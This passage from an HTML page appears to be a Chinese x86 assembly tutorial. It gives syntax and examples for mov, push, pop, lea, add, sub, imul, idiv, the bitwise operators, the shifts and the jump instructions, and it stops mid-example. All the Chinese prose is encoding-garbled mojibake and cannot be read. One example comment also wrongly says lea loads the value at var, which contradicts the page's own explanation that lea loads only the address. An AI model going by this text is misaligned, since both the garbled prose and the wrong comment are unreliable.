title="mov"></a>mov</h4><p>movæŒ‡ä»¤å°†ç¬¬äºŒæ“ä½œå¯¹è±¡ï¼ˆå¯„å­˜å™¨ã€å†…å­˜å†…å®¹æˆ–æ˜¯å¸¸é‡å€¼ï¼‰æ‰€å¼•ç”¨çš„æ•°æ®é¡¹å¤åˆ¶åˆ°å…¶ç¬¬ä¸€æ“ä½œå¯¹è±¡ï¼ˆå¯„å­˜å™¨æˆ–æ˜¯å†…å­˜ï¼‰æ‰€å¼•ç”¨çš„ä½ç½®ã€‚</p><p>å¯„å­˜å™¨åˆ°å¯„å­˜å™¨çš„ç§»åŠ¨æ˜¯åˆæ³•çš„ï¼Œä½†æ˜¯ç›´æ¥å†…å­˜åˆ°å†…å­˜çš„ç§»åŠ¨æ˜¯ä¸åˆæ³•çš„ã€‚åœ¨éœ€è¦å†…å­˜ä¼ è¾“çš„æƒ…å†µä¸‹ï¼Œå¿…é¡»é¦–å…ˆå°†æºå†…å­˜ä¸­çš„å†…å®¹åŠ è½½åˆ°å¯„å­˜å™¨ä¸­ï¼Œç„¶åæ‰èƒ½å°†å…¶å­˜å‚¨åˆ°ç›®æ ‡å†…å­˜åœ°å€ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov &lt;reg&gt;,&lt;reg&gt;<br>mov &lt;reg&gt;,&lt;mem&gt;<br>mov &lt;mem&gt;,&lt;reg&gt;<br>mov &lt;reg&gt;,&lt;const&gt;<br>mov &lt;mem&gt;,&lt;const&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax, ebx ; å°†EBXä¸­çš„å€¼å¤åˆ¶åˆ°EAX<br>mov byte ptr [var], 5 ; å°†5å­˜å‚¨åˆ°åœ°å€varçš„ä¸€ä¸ªå­—èŠ‚ä¸­<br></code></pre></td></tr></table></figure><h4 id="push"><a href="#push" class="headerlink" title="push"></a>push</h4><p>ESPï¼ˆå †æ ˆæŒ‡é’ˆï¼‰é€šè¿‡pushé€’å‡ã€‚</p><p>pushæŒ‡ä»¤å°†å…¶æ“ä½œå¯¹è±¡æ”¾åœ¨å†…å­˜ä¸­ç¡¬ä»¶æ”¯æŒå †æ ˆçš„é¡¶éƒ¨ã€‚å…·ä½“åœ°è¯´ï¼ŒPUSHé¦–å…ˆå°†ESPé€’å‡4ï¼Œç„¶åå°†å…¶æ“ä½œå¯¹è±¡æ”¾å…¥å†…å­˜åœ°å€[ESP]å¤„çš„32ä½å¤§å°çš„åŒºåŸŸä¸­ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push &lt;reg32&gt;<br>push &lt;mem&gt;<br>push &lt;con32&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push eax ; å°†eaxå…¥æ ˆ<br>push [var] ; å°†åœ°å€varå¤„å¼€å§‹çš„4ä¸ªå­—èŠ‚å…¥æ ˆ<br></code></pre></td></tr></table></figure><h4 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h4><p>popæŒ‡ä»¤å°†4å­—èŠ‚æ•°æ®å…ƒç´ ä»ç¡¬ä»¶æ”¯æŒçš„å †æ ˆé¡¶éƒ¨ç§»è‡³æŒ‡å®šçš„æ“ä½œå¯¹è±¡ï¼ˆå³å¯„å­˜å™¨æˆ–å†…å­˜ä½ç½®ï¼‰ã€‚å®ƒé¦–å…ˆå°†ä½äºå†…å­˜ä½ç½®[SP]çš„4ä¸ªå­—èŠ‚ç§»åŠ¨åˆ°æŒ‡å®šçš„å¯„å­˜å™¨æˆ–å†…å­˜ä½ç½®ï¼Œç„¶åå°†SPé€’å¢4ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop &lt;reg32&gt;<br>pop &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop edi ; å°†å †æ ˆçš„é¡¶éƒ¨å…ƒç´ å¼¹å‡ºåˆ°EDIä¸­<br>pop [ebx] ; å°†å †æ ˆçš„é¡¶éƒ¨å…ƒç´ å¼¹å‡ºåˆ°å†…å­˜ä»EBXä½ç½®å¼€å§‹çš„å››ä¸ªå­—èŠ‚ä¸­<br></code></pre></td></tr></table></figure><h4 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h4><p>leaæŒ‡ä»¤å°†å…¶ç¬¬äºŒä¸ªæ“ä½œå¯¹è±¡æŒ‡å®šçš„åœ°å€æ”¾å…¥å…¶<strong>ç¬¬ä¸€ä¸ªæ“ä½œå¯¹è±¡æŒ‡å®šçš„å¯„å­˜å™¨ä¸­</strong>ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå†…å­˜ä½ç½®çš„å†…å®¹ä¸ä¼šè¢«åŠ è½½ï¼Œå¹¶ä¸”åªæœ‰æœ‰æ•ˆåœ°å€ä¼šè¢«è®¡ç®—å¹¶æ”¾å…¥å¯„å­˜å™¨ä¸­ã€‚è¿™å¯¹äºè·å–æŒ‡å‘å†…å­˜åŒºåŸŸçš„æŒ‡é’ˆéå¸¸æœ‰ç”¨ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lea &lt;reg32&gt;,&lt;mem&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lea edi, [ebx+4*esi] ; å°†åœ°å€EBX+4*ESIæ”¾å…¥EDI<br>lea eax, [var] ; å°†varä¸­çš„å€¼æ”¾åœ¨EAXä¸­<br></code></pre></td></tr></table></figure><h2 id="ç®—æ•°å’Œé€»è¾‘è¿ç®—ç¬¦"><a href="#ç®—æ•°å’Œé€»è¾‘è¿ç®—ç¬¦" class="headerlink" title="ç®—æ•°å’Œé€»è¾‘è¿ç®—ç¬¦"></a>ç®—æ•°å’Œé€»è¾‘è¿ç®—ç¬¦</h2><h4 id="add-æ•´æ•°åŠ æ³•"><a href="#add-æ•´æ•°åŠ æ³•" class="headerlink" title="add-æ•´æ•°åŠ æ³•"></a>add-æ•´æ•°åŠ æ³•</h4><p>addæŒ‡ä»¤å°†å…¶ä¸¤ä¸ªæ“ä½œå¯¹è±¡ç›¸åŠ ï¼Œå°†ç»“æœå­˜å‚¨åœ¨ç¬¬ä¸€ä¸ªæ“ä½œå¯¹è±¡ä¸­ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶ä¸¤ä¸ªæ“ä½œå¯¹è±¡éƒ½å¯ä»¥æ˜¯å¯„å­˜å™¨ï¼Œ<strong>ä½†æœ€å¤šåªæœ‰ä¸€ä¸ªæ“ä½œå¯¹è±¡å¯ä»¥æ˜¯å†…å­˜ä½ç½®</strong>ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add &lt;reg&gt;,&lt;reg&gt;<br>add &lt;reg&gt;,&lt;mem&gt;<br>add &lt;mem&gt;,&lt;reg&gt;<br>add &lt;reg&gt;,&lt;con&gt;<br>add &lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add eax, 10 ; EAX â† EAX + 10<br>add BYTE PTR [var], 10 ; å°†å­˜å‚¨åœ¨å†…å­˜åœ°å€varçš„å•å­—èŠ‚å€¼åŠ ä¸Š10<br></code></pre></td></tr></table></figure><h4 id="sub-æ•´æ•°å‡æ³•"><a href="#sub-æ•´æ•°å‡æ³•" class="headerlink" title="sub-æ•´æ•°å‡æ³•"></a>sub-æ•´æ•°å‡æ³•</h4><p>subæŒ‡ä»¤å°†å…¶ç¬¬ä¸€ä¸ªæ“ä½œå¯¹è±¡çš„å€¼å‡å»ç¬¬äºŒä¸ªå¯¹è±¡çš„å€¼ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ç¬¬ä¸€ä¸ªå¯¹è±¡çš„å†…å­˜ä½ç½®ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub &lt;reg&gt;,&lt;reg&gt;<br>sub &lt;reg&gt;,&lt;mem&gt;<br>sub &lt;mem&gt;,&lt;reg&gt;<br>sub &lt;reg&gt;,&lt;con&gt;<br>sub &lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub al, ah ; AL â† AL - AH<br>sub eax, 216 ; ä»å­˜å‚¨åœ¨EAXä¸­çš„å€¼ä¸­å‡å»216<br></code></pre></td></tr></table></figure><h4 id="inc-dec-é€’å¢ï¼Œé€’å‡"><a href="#inc-dec-é€’å¢ï¼Œé€’å‡" class="headerlink" title="inc,dec-é€’å¢ï¼Œé€’å‡"></a>inc,dec-é€’å¢ï¼Œé€’å‡</h4><p>incæŒ‡ä»¤å°†å…¶æ“ä½œå¯¹è±¡çš„å†…å®¹+1ï¼›DECæŒ‡ä»¤å°†å…¶æ“ä½œå¯¹è±¡çš„å†…å®¹-1</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">inc &lt;reg&gt;<br>inc &lt;mem&gt;<br>dec &lt;reg&gt;<br>dec &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">dec eax ; ä»EAXçš„å†…å®¹ä¸­å‡å»1<br>inc DWORD PTR [var] ; å°†å­˜å‚¨åœ¨ä½ç½®varçš„32ä½æ•´æ•°åŠ 1<br></code></pre></td></tr></table></figure><h4 id="imul-æ•´æ•°ä¹˜æ³•"><a href="#imul-æ•´æ•°ä¹˜æ³•" class="headerlink" title="imul-æ•´æ•°ä¹˜æ³•"></a>imul-æ•´æ•°ä¹˜æ³•</h4><p>imulæŒ‡ä»¤æœ‰ä¸¤ç§åŸºæœ¬æ ¼å¼ï¼šä¸¤ä¸ªæ“ä½œå¯¹è±¡å’Œä¸‰ä¸ªæ“ä½œå¯¹è±¡ã€‚</p><p>æœ‰ä¸¤ä¸ªæ“ä½œå¯¹è±¡æ—¶å°†å…¶ä¸¤ä¸ªæ“ä½œå¯¹è±¡ç›¸ä¹˜ï¼Œå¹¶å°†ç»“æœå‚¨å­˜åœ¨ç¬¬ä¸€ä¸ªæ“ä½œå¯¹è±¡å½“ä¸­ï¼Œå…¶ä¸­ï¼Œç¬¬ä¸€ä¸ªå¯¹è±¡å¿…é¡»æ˜¯å¯„å­˜å™¨ã€‚</p><p>æœ‰ä¸‰ä¸ªæ“ä½œå¯¹è±¡æ—¶ï¼Œå°†ç¬¬äºŒä¸ªæ“ä½œå¯¹è±¡ä¸ç¬¬ä¸‰ä¸ªæ“ä½œå¯¹è±¡ç›¸ä¹˜ï¼Œå¹¶å°†å…¶ç»“æœå‚¨å­˜åœ¨ç¬¬ä¸€ä¸ªæ“ä½œå¯¹è±¡å½“ä¸­ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå¯¹è±¡å¿…é¡»æ˜¯å¯„å­˜å™¨ï¼Œç¬¬ä¸‰ä¸ªå¯¹è±¡å¿…é¡»æ˜¯å¸¸é‡å€¼ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">imul &lt;reg32&gt;,&lt;reg32&gt;<br>imul &lt;reg32&gt;,&lt;mem&gt;<br>imul &lt;reg32&gt;,&lt;reg32&gt;,&lt;con&gt;<br>imul &lt;reg32&gt;,&lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">imul eax, [var] ; å°†EAXçš„å†…å®¹ä¹˜ä»¥å†…å­˜ä½ç½®varçš„32ä½å†…å®¹å¹¶å°†ç»“æœå­˜å‚¨åœ¨EAXä¸­<br>imul esi, edi, 25 ; ESI â†’ EDI * 25<br></code></pre></td></tr></table></figure><h4 id="idiv-æ•´æ•°é™¤æ³•"><a href="#idiv-æ•´æ•°é™¤æ³•" class="headerlink" title="idiv-æ•´æ•°é™¤æ³•"></a>idiv-æ•´æ•°é™¤æ³•</h4><p>idivæŒ‡ä»¤å°†64ä½æ•´æ•°<code>EDX:EAX</code>çš„å†…å®¹é™¤ä»¥æŒ‡å®šçš„æ“ä½œå¯¹è±¡å€¼ã€‚ç»“æœå­˜å‚¨åœ¨EAXä¸­ï¼Œå…¶ä½™æ•°çš„å­˜å‚¨åœ¨EDXä¸­ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">idiv &lt;reg32&gt;<br>idiv &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">idiv ebx ; å°†EDX:EAXçš„å†…å®¹é™¤ä»¥EBXçš„å†…å®¹ã€‚æŠŠå•†æ”¾åœ¨EAXä¸­ï¼Œä½™æ”¾åœ¨EDXä¸­<br>idiv DWORD PTR [var] ; å°†EDX:EAXçš„å†…å®¹é™¤ä»¥å­˜å‚¨åœ¨å†…å­˜ä½ç½®varçš„32ä½å€¼ã€‚æŠŠå•†æ”¾åœ¨EAXä¸­ï¼Œä½™æ”¾åœ¨EDXä¸­<br></code></pre></td></tr></table></figure><h4 id="and-or-xor-æŒ‰ä½ä¸ã€æˆ–å’Œå¼‚æˆ–"><a href="#and-or-xor-æŒ‰ä½ä¸ã€æˆ–å’Œå¼‚æˆ–" class="headerlink" title="and,or xor-æŒ‰ä½ä¸ã€æˆ–å’Œå¼‚æˆ–"></a>and,or xor-æŒ‰ä½ä¸ã€æˆ–å’Œå¼‚æˆ–</h4><p>è¿™äº›æŒ‡ä»¤å¯¹å…¶æ“ä½œå¯¹è±¡æ‰§è¡ŒæŒ‡å®šçš„ä½è¿ç®—ï¼ˆåˆ†åˆ«ä¸ºæŒ‰ä½ä¸ã€æˆ–å’Œå¼‚æˆ–ï¼‰ï¼Œå¹¶å°†ç»“æœæ”¾åœ¨ç¬¬ä¸€ä¸ªæ“ä½œå¯¹è±¡ä½ç½®ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and &lt;reg&gt;,&lt;reg&gt;<br>and &lt;reg&gt;,&lt;mem&gt;<br>and &lt;mem&gt;,&lt;reg&gt;<br>and &lt;reg&gt;,&lt;con&gt;<br>and &lt;mem&gt;,&lt;con&gt;<br><br>or &lt;reg&gt;,&lt;reg&gt;<br>or &lt;reg&gt;,&lt;mem&gt;<br>or &lt;mem&gt;,&lt;reg&gt;<br>or &lt;reg&gt;,&lt;con&gt;<br>or &lt;mem&gt;,&lt;con&gt;<br><br>xor &lt;reg&gt;,&lt;reg&gt;<br>xor &lt;reg&gt;,&lt;mem&gt;<br>xor &lt;mem&gt;,&lt;reg&gt;<br>xor &lt;reg&gt;,&lt;con&gt;<br>xor &lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and eax, 0fH ; æ¸…é™¤EAXçš„é™¤æœ€å4ä½ä»¥å¤–çš„æ‰€æœ‰ä½<br>xor edx, edx ; å°†EDXçš„å†…å®¹è®¾ç½®ä¸ºé›¶<br></code></pre></td></tr></table></figure><h4 id="not-æŒ‰ä½å–å"><a href="#not-æŒ‰ä½å–å" class="headerlink" title="not-æŒ‰ä½å–å"></a>not-æŒ‰ä½å–å</h4><p>notæŒ‡ä»¤è§¦å‘åè½¬æ“ä½œå¯¹è±¡ä¸­çš„æ‰€æœ‰ä½ï¼Œå…¶ç»“æœç§°ä¸ºåç ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">not &lt;reg&gt;<br>not &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">not BYTE PTR [var] ; å–åå†…å­˜ä½ç½®varçš„å­—èŠ‚ä¸­çš„æ‰€æœ‰ä½<br></code></pre></td></tr></table></figure><h4 id="neg-æ±‚è¡¥"><a href="#neg-æ±‚è¡¥" class="headerlink" title="neg-æ±‚è¡¥"></a>neg-æ±‚è¡¥</h4><p>negæ˜¯æ±‡ç¼–æŒ‡ä»¤ä¸­çš„æ±‚è¡¥æŒ‡ä»¤ï¼Œå¯¹æ“ä½œå¯¹è±¡æ‰§è¡Œæ±‚è¡¥è¿ç®—ï¼šç”¨0å‡å»æ“ä½œå¯¹è±¡ï¼Œç„¶åç»“æœè¿”å›æ“ä½œå¯¹è±¡ï¼›æˆ–æ˜¯ç›´æ¥å°†æ“ä½œå¯¹è±¡æŒ‰ä½å–åå+1</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">neg &lt;reg&gt;<br>neg &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">neg eax ; EAX â†’ - EAX<br></code></pre></td></tr></table></figure><h4 id="shl-shr-å·¦ç§»ï¼Œå³ç§»"><a href="#shl-shr-å·¦ç§»ï¼Œå³ç§»" class="headerlink" title="shl, shr-å·¦ç§»ï¼Œå³ç§»"></a>shl, shr-å·¦ç§»ï¼Œå³ç§»</h4><p>è¿™äº›æŒ‡ä»¤å°†å…¶ç¬¬ä¸€ä¸ªæ“ä½œå¯¹è±¡å†…å®¹ä¸­çš„ä½å·¦å³ç§»ä½ï¼Œç”¨é›¶å¡«å……äº§ç”Ÿçš„ç©ºä½ä½ç½®ã€‚ç§»ä½åçš„æ“ä½œå¯¹è±¡æœ€å¤šå¯ä»¥ç§»ä½31ä½ã€‚è¦ç§»ä½çš„ä½æ•°ç”±ç¬¬äºŒä¸ªæ“ä½œå¯¹è±¡æŒ‡å®šï¼Œè¯¥æ“ä½œå¯¹è±¡å¯ä»¥æ˜¯8ä½å¸¸é‡ï¼Œä¹Ÿå¯ä»¥æ˜¯å¯„å­˜å™¨CLã€‚</p><p>åœ¨ä»»ä¸€æƒ…å†µä¸‹ï¼Œä»¥32ä¸ºæ¨¡æ‰§è¡Œå¤§äº31çš„ç§»ä½è®¡æ•°ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">shl &lt;reg&gt;,&lt;con8&gt;<br>shl &lt;mem&gt;,&lt;con8&gt;<br>shl &lt;reg&gt;,&lt;cl&gt;<br>shl &lt;mem&gt;,&lt;cl&gt;<br><br>shr &lt;reg&gt;,&lt;con8&gt;<br>shr &lt;mem&gt;,&lt;con8&gt;<br>shr &lt;reg&gt;,&lt;cl&gt;<br>shr &lt;mem&gt;,&lt;cl&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">shl eax, 1 ; å°†EAXçš„å€¼ä¹˜ä»¥2ï¼ˆå¦‚æœæœ€é«˜æœ‰æ•ˆä½ä¸º0ï¼‰<br>shr ebx, cl ; å°†EBXçš„å€¼é™¤ä»¥2^n^çš„ç»“æœçš„ä¸‹é™å­˜å‚¨åœ¨EBXä¸­ï¼Œå…¶ä¸­næ˜¯CLä¸­çš„å€¼<br></code></pre></td></tr></table></figure><h2 id="æ§åˆ¶æµæŒ‡ä»¤"><a href="#æ§åˆ¶æµæŒ‡ä»¤" class="headerlink" title="æ§åˆ¶æµæŒ‡ä»¤"></a>æ§åˆ¶æµæŒ‡ä»¤</h2><p>x86å¤„ç†å™¨ç»´æŠ¤ä¸€ä¸ªæŒ‡ä»¤æŒ‡é’ˆï¼ˆIPï¼‰å¯„å­˜å™¨ï¼Œå®ƒæ˜¯ä¸€ä¸ª32ä½å€¼ï¼ŒæŒ‡ç¤ºå½“å‰æŒ‡ä»¤åœ¨å†…å­˜ä¸­çš„èµ·å§‹ä½ç½®ã€‚é€šå¸¸ï¼Œåœ¨æ‰§è¡Œä¸€æ¡æŒ‡ä»¤åï¼Œå®ƒä¼šé€’å¢ä»¥æŒ‡å‘å†…å­˜ä¸­çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„èµ·å§‹ä½ç½®ã€‚IPå¯„å­˜å™¨ä¸èƒ½ç›´æ¥æ“ä½œï¼Œè€Œæ˜¯ç”±æä¾›çš„æ§åˆ¶æµæŒ‡ä»¤éšå¼æ›´æ–°ã€‚</p><blockquote><p>æˆ‘ä»¬ä½¿ç”¨ç¬¦å·&lt;LABEL&gt;æ¥è¡¨ç¤ºä»£ç ä¸­å·²æ ‡è®°çš„ä½ç½®ã€‚é€šè¿‡è¾“å…¥æ ‡ç­¾åç§°åè·Ÿå†’å·ï¼Œå¯ä»¥åœ¨x86æ±‡ç¼–ä»£ç ä¸­çš„ä»»æ„ä½ç½®æ’å…¥æ ‡ç­¾ã€‚</p></blockquote><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">       mov esi, [ebp+8]<br>begin: xor ecx, ecx<br>       mov eax, [esi]<br></code></pre></td></tr></table></figure><p>æ­¤ä»£ç æ®µä¸­çš„ç¬¬äºŒæ¡æŒ‡ä»¤è¢«æ ‡è®°ä¸ºbeginã€‚åœ¨ä»£ç çš„å…¶ä»–åœ°æ–¹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ›´æ–¹ä¾¿çš„ç¬¦å·åç§°beginæ¥å¼•ç”¨æ­¤æŒ‡ä»¤æ‰€åœ¨çš„å†…å­˜ä¸­çš„ä½ç½®ã€‚è¿™ä¸ªæ ‡ç­¾åªæ˜¯è¡¨ç¤ºä½ç½®çš„ä¸€ç§æ–¹ä¾¿æ–¹å¼ï¼Œè€Œä¸æ˜¯å®ƒçš„32ä½å€¼ã€‚</p><h4 id="jmp-è·³è½¬"><a href="#jmp-è·³è½¬" class="headerlink" title="jmp-è·³è½¬"></a>jmp-è·³è½¬</h4><p>å°†ç¨‹åºæ§åˆ¶æµè½¬ç§»åˆ°æ“ä½œå¯¹è±¡æŒ‡ç¤ºçš„å†…å­˜ä½ç½®ä¸Š</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp &lt;label&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp begin ; è·³åˆ°æ ‡è®°ä¸ºbeginçš„æŒ‡ä»¤ä½ç½®<br></code></pre></td></tr></table></figure><h4 id="jcondition-æ¡ä»¶è·³è½¬"><a href="#jcondition-æ¡ä»¶è·³è½¬" class="headerlink" title="jcondition-æ¡ä»¶è·³è½¬"></a>jcondition-æ¡ä»¶è·³è½¬</h4><p>è¿™äº›æŒ‡ä»¤æ˜¯åŸºäºä¸€ç»„æ¡ä»¶ç çŠ¶æ€åˆ¤æ–­æ˜¯å¦è¿›è¡Œè·³è½¬ï¼Œè¯¥æ¡ä»¶ç è¢«å­˜å‚¨åœ¨ç§°ä¸ºæœºå™¨çŠ¶æ€å­—çš„ç‰¹æ®Šå¯„å­˜å™¨ä¸­ã€‚</p><p>æœºå™¨çŠ¶æ€å­—çš„å†…å®¹åŒ…æ‹¬æœ‰å…³ä¸Šæ¬¡æ‰§è¡Œçš„ç®—æœ¯è¿ç®—çš„ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œæ­¤å­—çš„æŸä¸€æ¯”ç‰¹ä½è¡¨ç¤ºæœ€åç»“æœæ˜¯å¦ä¸ºé›¶ï¼ŒæŸå¦ä¸€ä¸ªæ¯”ç‰¹ä½æŒ‡ç¤ºä¸Šæ¬¡ç»“æœæ˜¯å¦ä¸ºè´Ÿæ•°ã€‚</p><p>åŸºäºè¿™äº›æ¡ä»¶ç ï¼Œå¯ä»¥æ‰§è¡Œå¤šä¸ªæ¡ä»¶è·³è½¬ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸Šæ¬¡ç®—æœ¯è¿ç®—çš„ç»“æœä¸ºé›¶ï¼Œåˆ™JZæŒ‡ä»¤æ‰§è¡Œåˆ°æŒ‡å®šæ“ä½œå¯¹è±¡æ ‡ç­¾çš„è·³è½¬ã€‚å¦åˆ™ï¼Œæ§åˆ¶æŒ‰é¡ºåºå‰è¿›åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</p><p>è®¸å¤šæ¡ä»¶åˆ†æ”¯çš„åå­—éƒ½æ˜¯æ ¹æ®ä¸Šä¸€æ¬¡æ‰§è¡Œçš„ç‰¹æ®Šæ¯”è¾ƒæŒ‡ä»¤cmpå‘½åçš„ã€‚ä¾‹å¦‚ï¼Œæ¡ä»¶åˆ†æ”¯ï¼ˆå¦‚JLEå’ŒJNEï¼‰åŸºäºé¦–å…ˆå¯¹æ‰€éœ€æ“ä½œå¯¹è±¡æ‰§è¡Œcmpæ“ä½œã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">je &lt;label&gt;  ; ç›¸ç­‰æ—¶è·³è½¬<br>jne &lt;label&gt; ; ä¸ç›¸ç­‰æ—¶è·³è½¬<br>jz &lt;label&gt;  ; æœ€åç»“æœä¸ºé›¶æ—¶è·³è½¬<br>jg &lt;label&gt;  ; å¤§äºæ—¶è·³è½¬<br>jge &lt;label&gt; ; å¤§äºç­‰äºæ—¶è·³è½¬<br>jl &lt;label&gt;  ; å°äºæ—¶è·³è½¬<br>jle &lt;label&gt; ; å°äºç­‰äºæ—¶è·³è½¬<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp eax, ebx<br>jle done ; 